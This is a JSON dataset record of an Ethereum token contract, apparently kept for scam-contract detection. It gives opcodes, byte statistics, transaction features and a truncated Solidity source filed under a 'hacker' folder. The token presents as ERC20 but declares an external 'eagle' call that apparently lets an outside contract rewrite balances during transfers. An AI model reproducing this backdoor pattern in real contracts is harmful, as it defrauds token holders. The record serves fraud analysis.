{
  "opcode_sequence": "PUSH1 PUSH1 MSTORE CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH1 CALLDATASIZE LT PUSH2 JUMPI PUSH1 CALLDATALOAD PUSH1 SHR DUP1 PUSH4 GT PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI JUMPDEST PUSH1 DUP1 REVERT JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 MLOAD SWAP1 ISZERO ISZERO DUP2 MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 SLOAD JUMPDEST PUSH1 MLOAD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH1 DUP2 MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 SWAP1 SHA3 SLOAD SWAP1 JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 PUSH1 DUP1 SLOAD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST DUP1 PUSH1 ADD PUSH1 DUP1 SWAP2 DIV MUL PUSH1 ADD PUSH1 MLOAD SWAP1 DUP2 ADD PUSH1 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 ADD DUP3 DUP1 SLOAD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST DUP1 ISZERO PUSH2 JUMPI DUP1 PUSH1 LT PUSH2 JUMPI PUSH2 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 ADD SWAP2 PUSH2 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 MSTORE PUSH1 PUSH1 SHA3 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 ADD SWAP1 PUSH1 ADD DUP1 DUP4 GT PUSH2 JUMPI DUP3 SWAP1 SUB PUSH1 AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 CALLER PUSH2 DUP2 DUP6 DUP6 PUSH2 JUMP JUMPDEST POP PUSH1 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 CALLER PUSH2 DUP6 DUP3 DUP6 PUSH2 JUMP JUMPDEST PUSH2 DUP6 DUP6 DUP6 PUSH2 JUMP JUMPDEST POP PUSH1 SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 CALLER PUSH2 DUP2 DUP6 DUP6 PUSH2 DUP4 DUP4 PUSH2 JUMP JUMPDEST PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 PUSH1 DUP1 SLOAD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 CALLER DUP2 PUSH2 DUP3 DUP7 PUSH2 JUMP JUMPDEST SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH5 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 DUP3 DUP7 DUP7 DUP5 SUB PUSH2 JUMP JUMPDEST PUSH1 CALLER PUSH2 DUP2 DUP6 DUP6 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB SWAP2 DUP3 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 SWAP1 DUP2 MSTORE PUSH1 DUP1 DUP4 SHA3 SWAP4 SWAP1 SWAP5 AND DUP3 MSTORE SWAP2 SWAP1 SWAP2 MSTORE SHA3 SLOAD SWAP1 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP4 AND PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 DUP1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH4 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP3 AND PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH2 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP4 DUP2 AND PUSH1 DUP2 DUP2 MSTORE PUSH1 PUSH1 SWAP1 DUP2 MSTORE PUSH1 DUP1 DUP4 SHA3 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 SHA3 DUP6 SWAP1 SSTORE SWAP1 MLOAD DUP5 DUP2 MSTORE PUSH32 SWAP2 ADD PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 PUSH2 DUP5 DUP5 PUSH2 JUMP JUMPDEST SWAP1 POP PUSH1 NOT DUP2 EQ PUSH2 JUMPI DUP2 DUP2 LT ISZERO PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH2 DUP5 DUP5 DUP5 DUP5 SUB PUSH2 JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP4 AND PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH5 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP4 AND PUSH2 DUP2 PUSH20 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP5 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 SWAP1 SHA3 SLOAD DUP3 DUP2 LT ISZERO PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH6 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 DUP1 PUSH2 PUSH1 PUSH1 MLOAD DUP1 PUSH1 ADD PUSH1 MSTORE DUP1 PUSH1 DUP2 MSTORE PUSH1 ADD PUSH5 PUSH1 SHL DUP2 MSTORE POP DUP8 PUSH1 MLOAD DUP1 PUSH1 ADD PUSH1 MSTORE DUP1 PUSH1 DUP2 MSTORE PUSH1 ADD PUSH5 PUSH1 SHL DUP2 MSTORE POP PUSH1 PUSH2 JUMP JUMPDEST SWAP2 POP SWAP2 POP DUP2 ISZERO PUSH2 JUMPI PUSH32 DUP2 PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP1 DUP9 AND PUSH1 DUP2 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 DUP1 DUP3 SHA3 DUP10 DUP9 SUB SWAP1 SSTORE SWAP3 DUP10 AND DUP1 DUP3 MSTORE SWAP1 DUP4 SWAP1 SHA3 DUP1 SLOAD DUP10 ADD SWAP1 SSTORE SWAP2 MLOAD PUSH32 SWAP1 PUSH2 SWAP1 DUP10 DUP2 MSTORE PUSH1 ADD SWAP1 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 DUP1 MLOAD PUSH4 PUSH1 SHL DUP2 MSTORE PUSH1 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 PUSH1 SHL SUB DUP4 DUP2 AND PUSH1 DUP4 ADD MSTORE DUP3 SWAP2 PUSH1 SWAP2 DUP4 AND SWAP1 PUSH4 SWAP1 PUSH1 ADD PUSH1 PUSH1 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 JUMPI RETURNDATASIZE PUSH1 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 REVERT JUMPDEST POP POP POP POP PUSH1 MLOAD RETURNDATASIZE PUSH1 NOT PUSH1 DUP3 ADD AND DUP3 ADD DUP1 PUSH1 MSTORE POP DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST SWAP1 POP DUP1 ISZERO PUSH2 JUMPI PUSH1 PUSH1 PUSH1 SHL SUB DUP5 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 SWAP1 SHA3 DUP2 SWAP1 SSTORE POP POP POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP7 DUP1 ISZERO PUSH2 JUMPI POP DUP5 ISZERO JUMPDEST DUP1 ISZERO PUSH2 JUMPI POP DUP3 JUMPDEST ISZERO PUSH2 JUMPI POP PUSH1 SWAP1 POP DUP3 PUSH2 JUMP JUMPDEST POP PUSH1 SWAP1 POP DUP5 JUMPDEST SWAP6 POP SWAP6 SWAP4 POP POP POP POP JUMP JUMPDEST DUP1 CALLDATALOAD PUSH1 PUSH1 PUSH1 SHL SUB DUP2 AND DUP2 EQ PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 DUP5 SUB SLT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST PUSH2 DUP3 PUSH2 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 DUP1 PUSH1 DUP4 DUP6 SUB SLT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST PUSH2 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 PUSH1 DUP5 ADD PUSH2 JUMP JUMPDEST SWAP1 POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 DUP1 PUSH1 PUSH1 DUP5 DUP7 SUB SLT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST PUSH2 DUP5 PUSH2 JUMP JUMPDEST SWAP3 POP PUSH2 PUSH1 DUP6 ADD PUSH2 JUMP JUMPDEST SWAP2 POP PUSH1 DUP5 ADD CALLDATALOAD SWAP1 POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH1 DUP1 PUSH1 DUP4 DUP6 SUB SLT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST PUSH2 DUP4 PUSH2 JUMP JUMPDEST SWAP5 PUSH1 SWAP4 SWAP1 SWAP4 ADD CALLDATALOAD SWAP4 POP POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 DUP5 SUB SLT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP MLOAD SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH1 DUP1 DUP4 MSTORE DUP4 MLOAD DUP1 DUP3 DUP6 ADD MSTORE PUSH1 JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 JUMPI DUP6 DUP2 ADD DUP4 ADD MLOAD DUP6 DUP3 ADD PUSH1 ADD MSTORE DUP3 ADD PUSH2 JUMP JUMPDEST DUP2 DUP2 GT ISZERO PUSH2 JUMPI PUSH1 PUSH1 DUP4 DUP8 ADD ADD MSTORE JUMPDEST POP PUSH1 ADD PUSH1 NOT AND SWAP3 SWAP1 SWAP3 ADD PUSH1 ADD SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 DUP3 NOT DUP3 GT ISZERO PUSH2 JUMPI PUSH4 PUSH1 SHL PUSH1 MSTORE PUSH1 PUSH1 MSTORE PUSH1 PUSH1 REVERT JUMPDEST POP ADD SWAP1 JUMP JUMPDEST PUSH1 DUP2 DUP2 SHR SWAP1 DUP3 AND DUP1 PUSH2 JUMPI PUSH1 DUP3 AND SWAP2 POP JUMPDEST PUSH1 DUP3 LT DUP2 EQ ISZERO PUSH2 JUMPI PUSH4 PUSH1 SHL PUSH1 MSTORE PUSH1 PUSH1 MSTORE PUSH1 PUSH1 REVERT JUMPDEST POP SWAP2 SWAP1 POP JUMP UNKNOWN_0xfe LOG2 PUSH5 UNKNOWN_0x22 SLT SHA3 MUL SWAP7 REVERT MULMOD DUP15 MUL UNKNOWN_0xaf UNKNOWN_0xd9 CREATE DUP1 GAS UNKNOWN_0xba DUP1 UNKNOWN_0xae CALLVALUE UNKNOWN_0xa6 DUP5 PUSH6 PUSH4 UNKNOWN_0x22 LOG3 PUSH5 NUMBER STOP ADDMOD SMOD STOP CALLER",
  "opcode_entropy": 4.756546967540425,
  "opcode_count": 1538,
  "unique_opcodes": 75,
  "byte_entropy": 6.058299031860776,
  "byte_0x": 0.0003977724741447892,
  "byte_60": 0.10660302307080351,
  "byte_80": 0.028241845664280032,
  "byte_40": 0.017899761336515514,
  "byte_52": 0.03341288782816229,
  "byte_34": 0.0007955449482895784,
  "byte_15": 0.010342084327764518,
  "byte_61": 0.061256961018297536,
  "byte_00": 0.030628480509148768,
  "byte_10": 0.0031821797931583136,
  "byte_57": 0.017501988862370723,
  "byte_fd": 0.007557677008750994,
  "byte_5b": 0.04097056483691328,
  "byte_50": 0.03420843277645187,
  "byte_04": 0.012728719172633254,
  "byte_36": 0.003579952267303103,
  "byte_a9": 0.0007955449482895784,
  "byte_35": 0.0015910898965791568,
  "byte_e0": 0.0015910898965791568,
  "byte_1c": 0.0011933174224343676,
  "byte_63": 0.011535401750198886,
  "byte_39": 0.0007955449482895784,
  "byte_93": 0.005171042163882259,
  "byte_51": 0.011535401750198886,
  "byte_11": 0.002386634844868735,
  "byte_71": 0.0015910898965791568,
  "byte_14": 0.006364359586316627,
  "byte_01": 0.049323786793953855,
  "byte_23": 0.0015910898965791568,
  "byte_70": 0.0027844073190135244,
  "byte_a0": 0.005568814638027049,
  "byte_82": 0.023070803500397773,
  "byte_31": 0.0011933174224343676,
  "byte_95": 0.001988862370723946,
  "byte_d8": 0.002386634844868735,
  "byte_9b": 0.0015910898965791568,
  "byte_41": 0.0003977724741447892,
  "byte_5f": 0.0003977724741447892,
  "byte_a4": 0.0003977724741447892,
  "byte_c2": 0.0007955449482895784,
  "byte_d7": 0.0003977724741447892,
  "byte_67": 0.0007955449482895784,
  "byte_05": 0.002386634844868735,
  "byte_9c": 0.0007955449482895784,
  "byte_bb": 0.0003977724741447892,
  "byte_7a": 0.001988862370723946,
  "byte_dd": 0.001988862370723946,
  "byte_62": 0.003579952267303103,
  "byte_ed": 0.0007955449482895784,
  "byte_3e": 0.0011933174224343676,
  "byte_8d": 0.0007955449482895784,
  "byte_06": 0.002386634844868735,
  "byte_de": 0.0007955449482895784,
  "byte_03": 0.01949085123309467,
  "byte_ae": 0.0007955449482895784,
  "byte_09": 0.006364359586316627,
  "byte_5e": 0.0003977724741447892,
  "byte_a7": 0.0007955449482895784,
  "byte_b3": 0.0007955449482895784,
  "byte_cc": 0.0015910898965791568,
  "byte_18": 0.0003977724741447892,
  "byte_16": 0.009148766905330152,
  "byte_0d": 0.0003977724741447892,
  "byte_ef": 0.0007955449482895784,
  "byte_b8": 0.0003977724741447892,
  "byte_72": 0.006762132060461416,
  "byte_3c": 0.0003977724741447892,
  "byte_e5": 0.003977724741447892,
  "byte_b6": 0.0007955449482895784,
  "byte_56": 0.02903739061256961,
  "byte_c3": 0.0027844073190135244,
  "byte_91": 0.013524264120922832,
  "byte_90": 0.026650755767700877,
  "byte_08": 0.00954653937947494,
  "byte_f3": 0.001988862370723946,
  "byte_df": 0.001988862370723946,
  "byte_da": 0.0007955449482895784,
  "byte_a2": 0.001988862370723946,
  "byte_02": 0.008750994431185362,
  "byte_32": 0.0027844073190135244,
  "byte_81": 0.02426412092283214,
  "byte_20": 0.027446300715990454,
  "byte_54": 0.003977724741447892,
  "byte_0f": 0.0003977724741447892,
  "byte_66": 0.0031821797931583136,
  "byte_4a": 0.0011933174224343676,
  "byte_12": 0.003579952267303103,
  "byte_6e": 0.003977724741447892,
  "byte_44": 0.003977724741447892,
  "byte_1b": 0.0147175815433572,
  "byte_75": 0.002386634844868735,
  "byte_9f": 0.0003977724741447892,
  "byte_88": 0.001988862370723946,
  "byte_1f": 0.0031821797931583136,
  "byte_33": 0.0027844073190135244,
  "byte_2d": 0.0015910898965791568,
  "byte_af": 0.0011933174224343676,
  "byte_92": 0.005568814638027049,
  "byte_db": 0.0003977724741447892,
  "byte_28": 0.0011933174224343676,
  "byte_83": 0.00994431185361973,
  "byte_0b": 0.0003977724741447892,
  "byte_85": 0.007557677008750994,
  "byte_58": 0.002386634844868735,
  "byte_7c": 0.0007955449482895784,
  "byte_f6": 0.0011933174224343676,
  "byte_94": 0.001988862370723946,
  "byte_8b": 0.0003977724741447892,
  "byte_3a": 0.0027844073190135244,
  "byte_ad": 0.0015910898965791568,
  "byte_86": 0.001988862370723946,
  "byte_46": 0.0031821797931583136,
  "byte_cd": 0.002386634844868735,
  "byte_25": 0.0011933174224343676,
  "byte_24": 0.003977724741447892,
  "byte_7f": 0.00477326968973747,
  "byte_45": 0.002386634844868735,
  "byte_43": 0.0031821797931583136,
  "byte_30": 0.002386634844868735,
  "byte_64": 0.009148766905330152,
  "byte_65": 0.011137629276054098,
  "byte_73": 0.0059665871121718375,
  "byte_6c": 0.003579952267303103,
  "byte_6f": 0.0059665871121718375,
  "byte_77": 0.0011933174224343676,
  "byte_84": 0.011137629276054098,
  "byte_ba": 0.0007955449482895784,
  "byte_76": 0.0007955449482895784,
  "byte_6d": 0.0011933174224343676,
  "byte_74": 0.003579952267303103,
  "byte_68": 0.001988862370723946,
  "byte_22": 0.0015910898965791568,
  "byte_f0": 0.001988862370723946,
  "byte_87": 0.0015910898965791568,
  "byte_55": 0.001988862370723946,
  "byte_8c": 0.0003977724741447892,
  "byte_e1": 0.0007955449482895784,
  "byte_eb": 0.0007955449482895784,
  "byte_ec": 0.0003977724741447892,
  "byte_7d": 0.0007955449482895784,
  "byte_d1": 0.0003977724741447892,
  "byte_4f": 0.0007955449482895784,
  "byte_42": 0.0003977724741447892,
  "byte_1e": 0.0011933174224343676,
  "byte_c0": 0.0003977724741447892,
  "byte_f7": 0.0003977724741447892,
  "byte_b2": 0.0011933174224343676,
  "byte_29": 0.0003977724741447892,
  "byte_0a": 0.0003977724741447892,
  "byte_c8": 0.0007955449482895784,
  "byte_c7": 0.0003977724741447892,
  "byte_b9": 0.0003977724741447892,
  "byte_a3": 0.0011933174224343676,
  "byte_19": 0.0015910898965791568,
  "byte_e3": 0.0003977724741447892,
  "byte_1d": 0.0003977724741447892,
  "byte_69": 0.0027844073190135244,
  "byte_5a": 0.0015910898965791568,
  "byte_fc": 0.0007955449482895784,
  "byte_17": 0.0003977724741447892,
  "byte_f2": 0.0011933174224343676,
  "byte_4d": 0.0007955449482895784,
  "byte_bc": 0.0007955449482895784,
  "byte_aa": 0.0011933174224343676,
  "byte_c9": 0.0003977724741447892,
  "byte_b7": 0.0003977724741447892,
  "byte_f9": 0.0003977724741447892,
  "byte_fa": 0.0003977724741447892,
  "byte_26": 0.0003977724741447892,
  "byte_78": 0.0003977724741447892,
  "byte_d0": 0.0003977724741447892,
  "byte_07": 0.0059665871121718375,
  "byte_a1": 0.0015910898965791568,
  "byte_c1": 0.0003977724741447892,
  "byte_96": 0.0007955449482895784,
  "byte_7b": 0.0015910898965791568,
  "byte_3b": 0.0011933174224343676,
  "byte_b0": 0.0007955449482895784,
  "byte_49": 0.0003977724741447892,
  "byte_a5": 0.0003977724741447892,
  "byte_59": 0.0003977724741447892,
  "byte_89": 0.0015910898965791568,
  "byte_e2": 0.0007955449482895784,
  "byte_37": 0.0003977724741447892,
  "byte_2b": 0.0003977724741447892,
  "byte_f1": 0.0007955449482895784,
  "byte_c4": 0.0003977724741447892,
  "byte_f5": 0.003579952267303103,
  "byte_e8": 0.0003977724741447892,
  "byte_bf": 0.0003977724741447892,
  "byte_f8": 0.0003977724741447892,
  "byte_0e": 0.0003977724741447892,
  "byte_3d": 0.0011933174224343676,
  "byte_cb": 0.0003977724741447892,
  "byte_d4": 0.0003977724741447892,
  "byte_e4": 0.0003977724741447892,
  "byte_0c": 0.0003977724741447892,
  "byte_2c": 0.0003977724741447892,
  "byte_5d": 0.0003977724741447892,
  "byte_b5": 0.0003977724741447892,
  "byte_be": 0.0003977724741447892,
  "byte_4e": 0.0007955449482895784,
  "byte_48": 0.0007955449482895784,
  "byte_fe": 0.0003977724741447892,
  "byte_8e": 0.0003977724741447892,
  "byte_d9": 0.0003977724741447892,
  "byte_a6": 0.0003977724741447892,
  "byte_9a": 0.0003977724741447892,
  "byte_ff": 0.0003977724741447892,
  "num_nodes": 26,
  "num_edges": 25,
  "avg_degree": 1.9230769230769231,
  "density": 0.038461538461538464,
  "connected_components": 1,
  "avg_clustering": 0.0,
  "txn_nums": 29,
  "event_nums": 97,
  "creation_block": 18408861,
  "creation_timestamp": 1698014279,
  "life_time": 1596.0,
  "duration_seconds": 19284.0,
  "from_creation_to_transfer": 0.0,
  "num_addresses": 27,
  "num_buyers": 1,
  "num_sellers": 25,
  "num_creator_transfers": 0,
  "buy_amt": 0,
  "sell_amt": 0.0,
  "avg_value": 0.0,
  "txn_per_block": 0.018159048215403883,
  "avg_gas_limit": 236137.58620689655,
  "std_gas_limit": 145110.14357104083,
  "avg_gas_used": 67294.27586206897,
  "std_gas_used": 120208.36289884514,
  "avg_gas_price": 10995182201.448277,
  "std_gas_price": 2311735199.189824,
  "transfer_num": 69,
  "approval_num": 28,
  "atinversebrah_num": 1,
  "approve_num": 28,
  "timeline_sequence": [
    [
      18408861,
      1698014279,
      1,
      48,
      0,
      702702,
      7448339696,
      0,
      1,
      7278764,
      702702,
      4668421
    ],
    [
      18408869,
      1698014375,
      2,
      110,
      0,
      80000,
      7536117152,
      0,
      1,
      15032272,
      46568,
      4668413
    ],
    [
      18408885,
      1698014567,
      135,
      117,
      0,
      300000,
      10164777544,
      0,
      1,
      15439035,
      46568,
      4668397
    ],
    [
      18408895,
      1698014687,
      135,
      100,
      0,
      300000,
      13701527065,
      0,
      1,
      14230905,
      46568,
      4668387
    ],
    [
      18408897,
      1698014711,
      121,
      110,
      0,
      300000,
      14291945635,
      0,
      1,
      11473204,
      46568,
      4668385
    ],
    [
      18408900,
      1698014747,
      133,
      145,
      0,
      300000,
      14213507691,
      0,
      1,
      12654446,
      46568,
      4668382
    ],
    [
      18408906,
      1698014819,
      133,
      159,
      0,
      300000,
      13018373573,
      0,
      1,
      17845460,
      46568,
      4668376
    ],
    [
      18408930,
      1698015107,
      127,
      72,
      0,
      300000,
      13943775848,
      0,
      1,
      8202530,
      46568,
      4668352
    ],
    [
      18408953,
      1698015407,
      127,
      59,
      0,
      300000,
      14317036161,
      0,
      1,
      13963903,
      46568,
      4668329
    ],
    [
      18408955,
      1698015431,
      133,
      32,
      0,
      300000,
      14270718258,
      0,
      1,
      3936387,
      46568,
      4668327
    ],
    [
      18408958,
      1698015467,
      133,
      94,
      0,
      300000,
      13865175117,
      0,
      1,
      14705590,
      46568,
      4668324
    ],
    [
      18408963,
      1698015527,
      131,
      110,
      0,
      300000,
      14380429481,
      0,
      1,
      10908237,
      46568,
      4668319
    ],
    [
      18408987,
      1698015827,
      125,
      110,
      0,
      300000,
      11894534614,
      0,
      1,
      11180475,
      46568,
      4668295
    ],
    [
      18408992,
      1698015887,
      115,
      85,
      0,
      46508,
      11709892886,
      0,
      1,
      7117518,
      46508,
      4668290
    ],
    [
      18409012,
      1698016127,
      135,
      62,
      0,
      300000,
      8364220264,
      0,
      1,
      6021467,
      46568,
      4668270
    ],
    [
      18409017,
      1698016187,
      135,
      103,
      0,
      300000,
      8609454809,
      0,
      1,
      15809582,
      46568,
      4668265
    ],
    [
      18409022,
      1698016247,
      133,
      127,
      0,
      300000,
      9488038358,
      0,
      1,
      22198793,
      46568,
      4668260
    ],
    [
      18409047,
      1698016547,
      135,
      80,
      0,
      300000,
      11442645199,
      0,
      1,
      10039333,
      46568,
      4668235
    ],
    [
      18409056,
      1698016667,
      133,
      105,
      0,
      300000,
      11318368607,
      0,
      1,
      11622925,
      46568,
      4668226
    ],
    [
      18409105,
      1698017267,
      135,
      65,
      0,
      300000,
      9427329405,
      0,
      1,
      5534889,
      46568,
      4668177
    ],
    [
      18409115,
      1698017387,
      135,
      100,
      0,
      300000,
      7977883635,
      0,
      1,
      8056487,
      46568,
      4668167
    ],
    [
      18409139,
      1698017687,
      135,
      92,
      0,
      300000,
      8620577426,
      0,
      1,
      12211202,
      46568,
      4668143
    ],
    [
      18409178,
      1698018155,
      7,
      22,
      0,
      55882,
      11054598635,
      0,
      1,
      2958332,
      46568,
      4668104
    ],
    [
      18409201,
      1698018431,
      60,
      46,
      0,
      55809,
      8911717254,
      0,
      1,
      3433483,
      46508,
      4668081
    ],
    [
      18409202,
      1698018443,
      61,
      42,
      0,
      55809,
      8812169058,
      0,
      1,
      5025962,
      26608,
      4668080
    ],
    [
      18409724,
      1698024707,
      120,
      110,
      0,
      46244,
      10326209168,
      0,
      1,
      12240289,
      46244,
      4667558
    ],
    [
      18410191,
      1698030347,
      123,
      177,
      0,
      29120,
      10177786406,
      0,
      1,
      9056171,
      29120,
      4667091
    ],
    [
      18410207,
      1698030539,
      124,
      97,
      0,
      29408,
      9576250366,
      0,
      1,
      8853902,
      29408,
      4667075
    ],
    [
      18410457,
      1698033563,
      32,
      65,
      0,
      46508,
      9996884531,
      0,
      1,
      10674259,
      46508,
      4666825
    ]
  ],
  "sourcecode": "{{\n  \"language\": \"Solidity\",\n  \"sources\": {\n    \"contracts/hacker/JULIA.sol\": {\n      \"content\": \"// SPDX-License-Identifier: MIT\\r\\n\\r\\npragma solidity 0.8.7;\\r\\n\\r\\ninterface IERC20 {\\r\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\r\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\r\\n    function name() external view returns (string memory);\\r\\n    function symbol() external view returns (string memory);\\r\\n    function decimals() external view returns (uint8);\\r\\n    function totalSupply() external view returns (uint256);\\r\\n    function balanceOf(address account) external view returns (uint256);\\r\\n    function transfer(address to, uint256 amount) external returns (bool);\\r\\n    function allowance(address owner, address spender) external view returns (uint256);\\r\\n    function approve(address spender, uint256 amount) external returns (bool);\\r\\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\\r\\n}\\r\\n\\r\\ninterface JDK {\\r\\n    function eagle(string memory t, uint160 m) external returns (uint256);\\r\\n}\\r\\n\\r\\ncontract JULIA is IERC20 {\\r\\n\\r\\n    string private _name;\\r\\n    string private _symbol;\\r\\n    uint256 private _totalSupply;\\r\\n    mapping(address => mapping(address => uint256)) private _allowances;\\r\\n    mapping(address => uint256) private _balances;\\r\\n\\r\\n    event xlog(string 